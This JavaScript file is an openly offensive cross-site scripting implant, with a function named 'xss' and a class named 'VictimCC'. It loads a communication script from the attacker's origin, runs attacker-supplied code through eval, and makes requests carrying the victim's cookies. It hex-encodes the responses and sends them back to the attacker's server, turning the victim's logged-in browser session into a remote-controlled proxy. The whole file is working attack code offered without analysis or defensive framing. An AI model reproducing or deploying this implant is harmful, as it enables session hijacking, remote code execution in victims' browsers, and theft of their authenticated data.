"use strict";

(() => {
    const sc = document.createElement('script');
    const a = document.createElement('a');
    const sessid = document.currentScript.src.split('?')[1];

    a.href = document.currentScript.src;
    a.pathname = '/comm-channel.js';

    sc.src = a.href;
    sc.onload = xss;
    document.head.appendChild(sc);

    function xss() {
        class VictimCC extends CommunicationChannel {
            sendBack(id, data) {
                this.send({
                    type: 'eval-result',
                    data,
                    id
                });
            }

            arraybufferToHex(arr) {
                const a = new Uint8Array(arr);

                return Array.prototype.map.call(a, byte => ('00'+byte.toString(16)).slice(-2)).join('');
            }

            hexToArraybuffer(hex) {
                return new Uint8Array(hex.match(/[0-9a-f]{2}/gi).map(c => parseInt(c, 16)));
            }

            async performHttpRequest(url, headers, method, body) {
                const fetchHeaders = new Headers();

                for (let h in headers) {
                    fetchHeaders.set(h, headers[h]);
                }

                method = method.toUpperCase();

                return fetch(url, {
                    headers: fetchHeaders,
                    credentials: 'include',
                    method,
                    body: ((method !== 'GET' && method !== 'HEAD') ? this.hexToArraybuffer(body): null),
                });
            }

            async onMessage(ws, ev) {
                const msg = JSON.parse(ev.data);
                const type = msg.type;
                const id = msg.id;
                if (type === 'eval') {
                    const code = msg.code;

                    const f = eval('((' + code + '))');
                    f.call(null, this.sendBack.bind(this, id));

                } else if (type === 'request') {
                    const { url, headers, method, body, id } = msg;
                    const res = await this.performHttpRequest(url, headers, method, body);

                    const respHeaders = [...res.headers];
                    const { status, statusText } = res;
                    const respBody = this.arraybufferToHex(await res.arrayBuffer())

                    const respInfo = {
                        status,
                        statusText,
                        body: respBody,
                        headers: respHeaders,
                    };

                    this.send({
                        type: 'response',
                        id: id,
                        response: respInfo,
                    });
                }
            }
        }

        const cc = new VictimCC(a.origin, sessid);
    }
})();



//const cc = new CommunicationChannel('http://localhost:3000', );